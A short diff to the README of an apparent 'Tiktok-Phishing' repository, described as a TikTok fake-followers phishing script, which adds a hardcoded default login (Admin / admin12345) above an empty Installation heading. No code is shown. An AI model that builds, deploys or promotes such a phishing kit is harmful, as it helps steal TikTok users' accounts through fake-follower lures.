@@ -1,5 +1,8 @@
 # Tiktok-Phishing
 
+Username : Admin
+Password : admin12345
+
 #TikTok Fake Followers Phishing Script.
 
 #Installation
